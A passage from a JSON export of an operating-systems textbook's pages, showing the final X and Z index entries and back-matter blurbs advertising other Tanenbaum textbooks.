401\r\nX Intrinsics, X11, 401\r\nX resource, 403\r\nX server, 401\r\nX window system, 18, 401–405, 720, 725\r\nX11 (see X window system)\r\nX86, 18\r\nX86–32, 18\r\nX86–64, 18\r\nXen, 474\r\nXlib, 401\r\nXP (see Windows XP)"
      },
      "Z": {
        "page": 1132,
        "content": "Z\r\nZ/VM, 69\r\nZero day attack, 974\r\nZeroPage thread, 941\r\nZombie, 598, 660\r\nZombie software, 639\r\nZombie state, 738\r\nZONE DMA, Linux, 758\r\nZONE DMA32, Linux, 758\r\nZONE HIGHMEM, Linux, 758\r\nZONE NORMAL, Linux, 758\r\nZuse, Konrad, 7\r\nZygote, 809–810, 815–816, 845–846\nThis page intentionally left blank \nAlso by Andrew S. Tanenbaum and Albert S. Woodhull\r\nOperating Systems: Design and Implementation, 3rd ed.\r\nAll other textbooks on operating systems are long on theory and short on practice. This one is\r\ndifferent. In addition to the usual material on processes, memory management, file systems, I/O, and\r\nso on, it contains a CD-ROM with the source code (in C) of a small, but complete, POSIX-confor\u0002mant operating system called MINIX 3 (see www.minix3.org). All the principles are illustrated by\r\nshowing how they apply to MINIX 3. The reader can also compile, test, and experiment with MINIX\r\n3, leading to in-depth knowledge of how an operating system really works.\nAlso by Andrew S. Tanenbaum and David J. Wetherall\r\nComputer Networks, 5th ed.\r\nThis widely read classic, with a fifth edition co-authored with David Wetherall, provides the\r\nideal introduction to today’s and tomorrow’s networks. It explains in detail how modern networks are\r\nstructured. Starting with the physical layer and working up to the application layer, the book covers a\r\nvast number of important topics, including wireless communication, fiber optics, data link protocols,\r\nEthernet, routing algorithms, network performance, security, DNS, electronic mail, the World Wide\r\nWeb, and multimedia. The book has especially thorough coverage of TCP/IP and the Internet.\nAlso by Andrew S. Tanenbaum and Todd Austin\r\nStructured Computer Organization, 6th ed.\r\nComputers are getting more complicated every year but this best-selling book makes computer\r\narchitecture and organization easy to understand. It starts at the very beginning explaining how a tran\u0002sistor works and from there explains the basic circuits from which computers are built. Then it moves\r\nup the design stack to cover the microarchitecture, and the assembly language level. The final chapter\r\nis about parallel computer architectures. No hardware background is needed to understand any part\r\nof this book.\nAlso by Andrew S. Tanenbaum and Maarten van Steen\r\nDistributed Systems: Principles and Paradigms, 2nd ed.\r\nDistributed systems are becoming ever-more important in the world and this book explains their\r\nprinciples and illustrates them with numerous examples. Among the topics covered are architectures,\r\nprocesses, communication, naming, synchronization, consistency, fault tolerance, and security. Exam\u0002ples are taken from distributed object-based, file, Web-based, and coordination-based systems."
      }
    }
  }
}